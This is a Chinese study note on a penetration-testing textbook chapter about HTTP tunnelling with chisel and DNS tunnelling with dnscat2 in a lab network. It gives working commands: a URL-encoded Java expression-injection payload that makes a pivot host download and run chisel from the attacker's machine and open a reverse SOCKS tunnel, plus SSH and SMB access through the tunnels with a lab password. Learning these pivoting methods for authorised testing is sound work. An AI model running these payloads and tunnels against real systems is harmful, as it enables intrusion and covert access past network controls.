本篇对应教材第19章，主要内容“HTTP隧道”、“DNS隧道”，记录使用工具和命令

## 19.1 HTTP隧道

### 19.1.2 使用chisel搭建HTTP隧道

kali（192）---linux跳板1（192和10）---目标（10）

kali开启web服务提供下载chisel使用，并开启chisel反向代理

```armasm
sudo systemctl start apache2
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
sudo cp ./chisel /var/www/html

chisel server --port 8080 --reverse
```

在linux跳板1上下载并执行

```armasm
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
```

linux跳板1上是使用web漏洞进行命令执行的，需要url编码

```armasm
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
```

kali上查看，默认是1080端口开socks服务，安装ncat，ssh到10段通过本地的1080端口socks转发

```armasm
ss -ntplu
sudo apt install ncat
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

## 19.2 DNS隧道

### 19.2.2 使用dnscat2搭建DNS隧道

kali（192）---……---跳板（任意和172）--目标（172）

前提是跳板发出的dns请求不管转发多少次，最终由kali上的服务端解析

在kali上启动dnscat2的服务端

```armasm
dnscat2-server feline.corp
```

启动后会开启53端口监听

跳板上启动dnscat2客户端

```armasm
./dnscat feline.corp
```

运行成功后会在服务端看到客户端连接成功，查看并配置客户端转发策略，就可以本地连接目标172主机

```armasm
windows
window -i 1
?
listen --help
listen 127.0.0.1:4455 172.16.2.11:445

smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```

更多更新资料（微信公众号：TopRedTeam）

![](./qrcode.jpg)
